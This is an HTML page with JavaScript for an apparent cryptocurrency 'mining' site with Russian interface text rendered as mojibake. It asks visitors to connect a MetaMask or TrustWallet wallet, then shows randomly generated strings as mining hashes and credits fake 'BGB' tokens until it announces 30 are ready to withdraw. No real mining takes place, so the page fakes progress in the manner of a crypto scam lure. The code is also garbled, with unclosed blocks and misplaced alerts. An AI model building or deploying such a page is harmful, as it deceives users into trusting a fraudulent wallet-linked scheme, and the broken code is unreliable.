<!DOCTYPE html>

<body>

    <script>
        const CONTRACT_ADDRESS = "0xFeF80dbC16251862b82286864D77aFA08ECBcb5C";
        let web3;
        let account;
        let minedTokens = 0;
        let mining = false;

        async function connectWallet() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                document.getElementById("wallet").innerText = `–ö–æ—à–µ–ª—ë–∫: ${account}`;

                alert("–£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ MetaMask –∏–ª–∏ TrustWallet!");

        async function getBalance() {

            document.getElementById("balance").innerText = `–ë–∞–ª–∞–Ω—Å: ... –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è`;
        }

        function generateHash() {
            return [...Array(16)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
        }

        async function startMining() {
            if (!account) return alert("–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫!");
            if (mining) return alert("–ú–∞–π–Ω–∏–Ω–≥ —É–∂–µ –∏–¥—ë—Ç!");
            mining = true;

            const terminal = document.getElementById("terminal");
            terminal.innerHTML = "";

            let difficulty = 300; // –Ω–∞—á–∞–ª—å–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞
            const miningInterval = setInterval(() => {
                if (!mining) {
                    clearInterval(miningInterval);
                    return;
                }

                const hash = generateHash();
                const line = document.createElement("div");
                line.textContent = `–•—ç—à: ${hash}`;
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;

                minedTokens += 0.5;
                document.getElementById("mined").innerText = `–ù–∞–º–∞–π–Ω–µ–Ω–æ: ${minedTokens.toFixed(2)} BGB`;

                if (minedTokens >= 30) {
                    clearInterval(miningInterval);

                    alert("–í—ã –Ω–∞–º–∞–π–Ω–∏–ª–∏ 30 BGB! –¢–µ–ø–µ—Ä—å –º–æ–∂–µ—Ç–µ –≤—ã–≤–µ—Å—Ç–∏!");

            }, difficulty);

        document.getElementById("connect").addEventListener("click", connectWallet);

    </script>
